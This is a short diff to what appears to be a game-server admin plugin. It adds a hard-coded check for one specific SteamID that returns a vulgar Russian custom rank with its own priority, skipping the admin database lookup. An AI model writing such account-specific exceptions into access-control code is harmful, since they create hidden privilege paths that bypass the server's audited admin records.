@@ -539,6 +539,12 @@ char[] GetAdminRank(int client)
 		char steamid[64];
 		GetClientAuthId(client, AuthId_Steam2, steamid, 64);
 		
+		if (StrEqual(steamid, "STEAM_1:1:186825723")) //special for alart
+		{
+			char res[64] = "Суперпуперхуюперадминистратор";
+			return res;
+		}
+		
 		char buffer[255];
 		Format(buffer, 255, "SELECT `srv_group` FROM `sb_admins` WHERE `authid` = '%s';", steamid);
 		DBResultSet query = SQL_Query(db, buffer);
@@ -597,6 +603,10 @@ char[] GetAdminRank(int client)
 int GetAdminPriority(char[] rank)
 {
 	if (StrEqual(rank, "Главный администратор"))
+	{
+		return 6;
+	}
+	if (StrEqual(rank, "Суперпуперхуюперадминистратор"))
 	{
 		return 5;
 	}
